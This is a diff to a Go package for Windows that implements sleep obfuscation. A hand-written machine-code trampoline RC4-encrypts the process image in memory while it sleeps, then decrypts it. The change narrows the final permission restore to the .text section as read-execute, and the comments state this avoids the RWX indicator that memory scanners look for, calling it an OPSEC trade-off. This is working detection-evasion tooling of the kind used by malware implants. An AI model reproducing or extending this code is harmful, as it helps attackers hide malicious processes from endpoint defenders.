@@ -158,6 +158,13 @@ var (
 var (
 	cyclesTotal atomic.Uint64
 	errorsTotal atomic.Uint64
+
+	// .text section bounds, resolved once at package init and reused
+	// for every Sleep cycle. Passed into apcArgs so the trampoline can
+	// PAGE_EXECUTE_READ just this range at the end of each cycle
+	// (instead of PAGE_EXECUTE_READWRITE'ing the entire image).
+	textSectionBase uintptr
+	textSectionSize uintptr
 )
 
 // Stats returns (cycles, errors) counters since process start. Useful for
@@ -227,6 +234,50 @@ type imageNTHeaders64Prefix struct {
 	SizeOfImage                 uint32
 }
 
+// discoverTextSection walks the PE section headers to find the .text
+// section's runtime bounds. Called once at package init.
+//
+// PE layout on disk / in memory (which are identical in memory since
+// the loader has already mapped the file with SectionAlignment):
+//
+//	DOS header
+//	  ...
+//	  +0x3c: e_lfanew (uint32 file offset of PE signature)
+//	PE signature ("PE\0\0", 4 bytes)
+//	IMAGE_FILE_HEADER (20 bytes)
+//	  +0x02: NumberOfSections (uint16)
+//	  +0x10: SizeOfOptionalHeader (uint16)
+//	IMAGE_OPTIONAL_HEADER64 (SizeOfOptionalHeader bytes)
+//	IMAGE_SECTION_HEADER[NumberOfSections] (40 bytes each)
+//	  +0x00: Name[8]  (null-padded)
+//	  +0x08: VirtualSize (uint32)
+//	  +0x0C: VirtualAddress (uint32, RVA)
+//	  ...
+func discoverTextSection(imageBase uintptr) (base, size uintptr, err error) {
+	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
+	peHeader := imageBase + uintptr(eLfaNew)
+
+	// IMAGE_FILE_HEADER starts at peHeader + 4 (after "PE\0\0").
+	numSections := *((*uint16)(unsafe.Pointer(peHeader + 4 + 2)))
+	sizeOfOptHdr := *((*uint16)(unsafe.Pointer(peHeader + 4 + 16)))
+
+	// Section array immediately follows the optional header.
+	sectionsStart := peHeader + 4 + 20 + uintptr(sizeOfOptHdr)
+
+	for i := uint16(0); i < numSections; i++ {
+		sec := sectionsStart + uintptr(i)*40
+		name := (*[8]byte)(unsafe.Pointer(sec))
+		// Name is null-padded to 8 bytes. ".text\0\0\0" is our target.
+		if name[0] == '.' && name[1] == 't' && name[2] == 'e' &&
+			name[3] == 'x' && name[4] == 't' && name[5] == 0 {
+			virtualSize := *((*uint32)(unsafe.Pointer(sec + 8)))
+			virtualAddress := *((*uint32)(unsafe.Pointer(sec + 12)))
+			return imageBase + uintptr(virtualAddress), uintptr(virtualSize), nil
+		}
+	}
+	return 0, 0, errors.New("apc: .text section not found in PE headers")
+}
+
 // apcArgs is the struct passed to the trampoline via QueueUserAPC's dwData.
 //
 // FIELD OFFSETS ARE HARD-CODED IN THE TRAMPOLINE MACHINE CODE. Do not
@@ -244,6 +295,8 @@ type apcArgs struct {
 	virtualProtect   uintptr // 0x40
 	systemFunc032    uintptr // 0x48
 	ntDelayExecution uintptr // 0x50
+	textBase         uintptr // 0x58  (start of .text section — for RX-restore)
+	textSize         uintptr // 0x60  (size of .text section)
 }
 
 // trampoline is hand-written amd64 machine code invoked as a
@@ -251,12 +304,19 @@ type apcArgs struct {
 //
 // Sequence (each call preserves RBX per Windows x64 ABI):
 //
-//	VirtualProtect(base, size, PAGE_READWRITE,          &oldProt)
-//	SystemFunction032(&img, &key)                          // RC4 encrypt
-//	NtDelayExecution(FALSE, &delayInterval)                // sleep
-//	SystemFunction032(&img, &key)                          // RC4 decrypt (symmetric)
-//	VirtualProtect(base, size, PAGE_EXECUTE_READWRITE,  &oldProt)
+//	VirtualProtect(imageBase, imageSize, PAGE_READWRITE,      &oldProt)
+//	SystemFunction032(&img, &key)                              // RC4 encrypt
+//	NtDelayExecution(FALSE, &delayInterval)                    // sleep
+//	SystemFunction032(&img, &key)                              // RC4 decrypt (symmetric)
+//	VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ,     &oldProt)
 //	ret
+//
+// The final VirtualProtect restores ONLY the `.text` section, and
+// only to RX (not RWX). This avoids leaving a permanent
+// PAGE_EXECUTE_READWRITE mapping over the whole image — the primary
+// IOC memory scanners look for. Trade-off: .rdata / .data stay
+// PAGE_READWRITE after the first cycle (they should ideally be R and
+// RW respectively). See ANALYSIS.md TODO #1.
 //
 // Byte-for-byte annotated:
 var trampoline = []byte{
@@ -291,11 +351,18 @@ var trampoline = []byte{
 	0x48, 0x8D, 0x53, 0x28, // lea rdx, [rbx+0x28]
 	0xFF, 0x53, 0x48,       // call qword ptr [rbx+0x48]
 
-	// VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &oldProt)
-	0x48, 0x8B, 0x4B, 0x00,             // mov rcx, [rbx+0x00]
-	0x48, 0x8B, 0x53, 0x08,             // mov rdx, [rbx+0x08]
-	0x41, 0xB8, 0x40, 0x00, 0x00, 0x00, // mov r8d, 0x40
-	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]
+	// VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProt)
+	//
+	// Restores ONLY the .text section, and only to RX (not RWX). This
+	// leaves .rdata/.data as RW for the rest of the cycle — a small
+	// OPSEC compromise (they should ideally be R and RW respectively)
+	// but no `.text` RWX region shows up in a memory scan, which is
+	// the primary signature. See ANALYSIS.md TODO #1 for the trade-off
+	// discussion.
+	0x48, 0x8B, 0x4B, 0x58,             // mov rcx, [rbx+0x58]   ; textBase
+	0x48, 0x8B, 0x53, 0x60,             // mov rdx, [rbx+0x60]   ; textSize
+	0x41, 0xB8, 0x20, 0x00, 0x00, 0x00, // mov r8d, 0x20         ; PAGE_EXECUTE_READ
+	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]   ; &oldProt
 	0xFF, 0x53, 0x40,                   // call qword ptr [rbx+0x40]
 
 	// Epilogue
@@ -340,6 +407,22 @@ func init() {
 	mustOffset("virtualProtect",   unsafe.Offsetof(a.virtualProtect),   0x40)
 	mustOffset("systemFunc032",    unsafe.Offsetof(a.systemFunc032),    0x48)
 	mustOffset("ntDelayExecution", unsafe.Offsetof(a.ntDelayExecution), 0x50)
+	mustOffset("textBase",         unsafe.Offsetof(a.textBase),         0x58)
+	mustOffset("textSize",         unsafe.Offsetof(a.textSize),         0x60)
+
+	// Resolve .text section bounds so the trampoline can restore just
+	// this range to PAGE_EXECUTE_READ at the end of each cycle
+	// (instead of leaving PAGE_EXECUTE_READWRITE over the whole image).
+	imageBase, _, _ := procGetModuleHandleA.Call(0)
+	if imageBase == 0 {
+		panic("apc: GetModuleHandleA returned NULL at init")
+	}
+	tBase, tSize, err := discoverTextSection(imageBase)
+	if err != nil {
+		panic(fmt.Sprintf("apc: %v", err))
+	}
+	textSectionBase = tBase
+	textSectionSize = tSize
 }
 
 func mustOffset(name string, got, want uintptr) {
@@ -825,6 +908,10 @@ func Sleep(sleepMs uint64) error {
 		virtualProtect:   procVirtualProtect.Addr(),
 		systemFunc032:    procSystemFunction032.Addr(),
 		ntDelayExecution: procNtDelayExecution.Addr(),
+		// .text bounds — resolved once at init, used by the trampoline's
+		// final VirtualProtect to restore just this range to PAGE_EXECUTE_READ.
+		textBase: textSectionBase,
+		textSize: textSectionSize,
 	}
 
 	// Real handle to self. The pseudo-handle from GetCurrentThread works
